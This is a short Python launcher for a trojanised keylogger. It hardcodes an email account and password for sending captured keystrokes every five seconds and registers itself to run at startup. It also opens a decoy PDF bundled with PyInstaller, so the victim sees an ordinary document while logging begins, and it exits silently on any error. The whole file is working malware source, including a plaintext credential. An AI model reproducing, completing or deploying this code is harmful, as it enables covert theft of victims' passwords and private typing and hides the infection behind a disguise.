#!/usr/bin/env python
import KLogger
import sys, subprocess

EMAIL = "ryuzaki.hcker@gmail.com"
PASSWORD = "ml2yvCuCRz7OxDWy2lgshHrWxbrlGGhRH"
INTERVAL= 5
WS_FNAME="exemples.pdf"

def white_side():
    PATH = sys._MEIPASS + WS_FNAME
    subprocess.Popen(PATH, shell=True)
    

try:
    key_log = KLogger.Klogger(EMAIL, PASSWORD,INTERVAL)
    key_log.run_at_startup()
    white_side()
    key_log.start()
except Exception as err:
    sys.exit()